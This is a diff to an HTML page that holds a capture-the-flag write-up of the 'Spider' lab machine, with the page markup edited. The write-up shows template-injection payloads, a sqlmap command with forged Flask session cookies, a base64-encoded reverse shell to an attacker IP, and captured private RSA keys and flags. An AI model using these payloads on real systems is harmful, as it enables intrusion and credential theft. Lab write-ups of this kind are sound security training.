@@ -85,7 +85,8 @@
 <div class="article-container"> <!-- beginning of breakup container -->
 
 <!-- space fore article -->
-<pre class="article-text" style="font-size: 1vw; float: center;">
+<p style="font-size: 1vw; float: left;">
+<pre>
 
 --██████--██▓███---██▓▓█████▄-▓█████--██▀███--
 ▒██----▒-▓██░--██▒▓██▒▒██▀-██▌▓█---▀-▓██-▒-██▒
@@ -107,6 +108,7 @@ that there are only two ports open:
 
  22/tcp Openssh 7.6p1
  80/tcp http nginx 1.14.0
+</pre>
 
 checking the webpage we get redirected to spider.htb, as such 
 we add this to our host list on our machine. before checking it
@@ -125,7 +127,7 @@ though this we can tell that is running either jinja2 or flask.
 as such we can try making another account instead using {{config}}
 afetr doing this we get this:
 
-<pre class="box0">
+<pre class="box13">
  Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS':
   None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942',
    'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None,
@@ -154,7 +156,7 @@ use of SQLmap, but first we need to download the req to do it:
 
 after doing this we will now use SQLmap with the command:
 
-<pre class="box0">
+<pre class="box13">
 sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign
  ({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" 
  --delay 1 --dump
@@ -163,6 +165,7 @@ sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session
 running this in SQLmap, we get back the responce of a table dump,
 as can be seen below:
  
+<pre class="box13">
  +----+--------------------------------------+------------+-----------------+
  | id | uuid                                 | name       | password        |
  +----+--------------------------------------+------------+-----------------+
@@ -172,6 +175,7 @@ as can be seen below:
  | 4  | a5b59f4e-99c3-4499-bf23-3a5f1aec7b2e | {{13*1}}   | virgo           |
  | 5  | 76799805-2a4f-41c0-8648-3339ccd72f6b | {{config}} | virgo           |
  +----+--------------------------------------+------------+-----------------+
+</pre>
 
 as we can see, there i my accounts made and also another one:
 
@@ -183,18 +187,20 @@ after doing this we are now able to log into chiv and check messages
 where we see messages, there is a portal.
 which needs to be fixxed, this was also found during the SQLmap dump:
 
+<pre class="box13">
  +---------+---------+-----------------------------------------------------------------------------------+---------------------+
  | post_id | creator | message                                                                           | timestamp           |
  +---------+---------+-----------------------------------------------------------------------------------+---------------------+
  | 1       | 1       | Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal! | 2020-04-24 15:02:41 |
  +---------+---------+-----------------------------------------------------------------------------------+---------------------+
+</pre>
 
 after looking at this portal, we can see that it is a page
 for people to be able to submit tickets for support, as such i would
 assume that this is vulnerable to template injection aswell.
 so i find one on google which uses a base64 rev shell:
 
-<pre class="box0">
+<pre class="box13">
  rev shell = YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC82NjYwIDA+JjE=
  {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]
  ["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]
@@ -210,11 +216,11 @@ AND we get our shell on the machine and as such we are
 now are able to get our user flag / token:
 
  user flag / token: 0d9319a471871927c0d3f49ced277984
- ________________________________________________
 
 we also have a ssh key for the user, which we will use since it
 will be a more secure connection:
 
+<pre class="box13">
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
  gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
@@ -242,7 +248,7 @@ will be a more secure connection:
  TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
  IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
  -----END RSA PRIVATE KEY-----
-
+</pre>
 
 using this key we are then able to sign back into the system.
 afetr this we run linpeas and we find there is another service
@@ -257,7 +263,7 @@ extenction.
 
 we use flask-unsign to try and decode this:
 
-<pre class="box0">
+<pre class="box13">
  flask-unsign --decode --cookie .eJxNjE1vgyAAhv_KwnkH7GqTmexiAG03dKCActPSB
  C1-ZDWptel_n70sO7553ue5Azd3DgR38FKDAAicEIPnnJ0Pkqupl52nTore6lg3lSDbPBpDIzzECk4l4l8C20
  _T7ReRTWjlfSaSMCVjzNtQP_lza-gQU-bAIN5qYtM6SqZE2UZ64kdH3uUkh1uKLKWe3im39qQrqJqZ3rz3_30
@@ -282,6 +288,7 @@ we will use this when we intercept the login process.
 and adding it in where the username should go we get an RSA key,
 where the name should be:
 
+<pre class="box13">
  -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq 
  gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZD
  RkvFvGfihWqAnkuJNqoVJclgIXLuwUvk 4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z
@@ -300,11 +307,13 @@ where the name should be:
   6ClDRswwMP31jnW0j 64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK teYjUjFTLgoi8
   MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8 vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlV
   MUdxeo+j -----END RSA PRIVATE KEY-----
+</pre>
 
 using this it does work due to the format, as such taking
 a look at the pages source code we get the properformat.
 now using this (see below) to login we get.....
 
+<pre class="box13">
  -----BEGIN RSA PRIVATE KEY-----
  MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq
  gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt
@@ -332,12 +341,12 @@ now using this (see below) to login we get.....
  teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8
  vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j
  -----END RSA PRIVATE KEY-----
-
+</pre>
 using this we gain root on the system and are able
 to grab the root flag / token:
 
  root flag / token = 4f3ab96fce4bc67279861e8fb97c657b
-</pre>
+</p>
 </div><!-- end of article container -->
 
 <br>
